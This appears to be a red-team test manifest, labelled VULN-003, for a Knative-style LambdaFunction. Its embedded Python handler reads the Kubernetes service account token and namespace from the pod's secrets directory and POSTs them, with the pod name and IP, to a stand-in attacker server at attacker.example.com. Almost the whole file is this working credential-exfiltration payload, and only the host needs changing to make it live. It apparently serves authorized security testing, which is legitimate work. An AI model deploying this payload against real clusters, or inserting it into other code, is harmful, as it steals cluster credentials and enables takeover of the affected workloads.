# VULN-003: Arbitrary Code Execution - Token Exfiltration
# ⚠️ AUTHORIZED TESTING ONLY
#
# This exploit uses inline source to exfiltrate the Kubernetes
# service account token to an attacker-controlled server.
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: vuln-003-exfil-token
  labels:
    redteam: "true"
    exploit: "vuln-003"
    target: "token-exfil"
  annotations:
    redteam.knative.io/description: "Inline code to exfiltrate SA token"
spec:
  source:
    type: inline
    inline:
      code: |
        import os
        import urllib.request
        import json
        
        # Read service account token
        TOKEN_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/token'
        NAMESPACE_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/namespace'
        
        def handler(event):
            """Exfiltrate Kubernetes credentials"""
            try:
                # Read credentials
                with open(TOKEN_PATH, 'r') as f:
                    token = f.read().strip()
                
                with open(NAMESPACE_PATH, 'r') as f:
                    namespace = f.read().strip()
                
                # Prepare exfil data
                data = {
                    'token': token,
                    'namespace': namespace,
                    'pod_name': os.environ.get('HOSTNAME', 'unknown'),
                    'pod_ip': os.environ.get('POD_IP', 'unknown'),
                }
                
                # Exfiltrate to attacker server
                payload = json.dumps(data).encode('utf-8')
                req = urllib.request.Request(
                    'http://attacker.example.com/collect/token',
                    data=payload,
                    headers={'Content-Type': 'application/json'}
                )
                urllib.request.urlopen(req, timeout=5)
                
                return {"status": "exfiltrated", "namespace": namespace}
            except Exception as e:
                return {"error": str(e)}
      dependencies: |
        # No external dependencies needed
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
